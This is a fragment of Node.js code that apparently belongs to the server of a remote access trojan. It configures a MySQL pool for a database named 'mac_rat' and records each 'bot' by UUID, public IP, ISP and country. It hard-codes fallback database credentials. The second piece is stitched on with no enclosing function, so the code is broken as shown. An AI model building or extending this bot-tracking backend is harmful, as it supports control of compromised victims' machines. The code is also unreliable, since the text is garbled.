const mysql = require("mysql2/promise");
const dotenv = require("dotenv");

// Load environment variables from .env file
dotenv.config();

const DB_HOST = process.env.DB_HOST || "localhost";
const DB_USER = process.env.DB_USER || "mac";
const DB_PASSWORD = process.env.DB_PASSWORD || "asdfasdf";
const DB_NAME = process.env.DB_NAME || "mac_rat";

const pool = mysql.createPool({
  connectionLimit: 10,
  host: DB_HOST,
  user: DB_USER,
  password: DB_PASSWORD,
  database: DB_NAME,
});

module.exports = pool;

    let connection;
    try {
      connection = await DBPool.getConnection();
      const [result] = await connection.query(
        `INSERT INTO bots (uuid, updated_at, publicip, isp, country)
         VALUES (?, NOW(), ?, ?, ?)
         ON DUPLICATE KEY UPDATE
          updated_at = NOW(),
          publicip = VALUES(publicip),
          isp = VALUES(isp),
          country = VALUES(country)`,
        [
          botUId,
          clientIp,
          isp, country
        ]
      );
      return result.insertId; // Return the inserted user ID
    } catch (err) {
      throw err;
    } finally {
      if (connection) connection.release();
    }
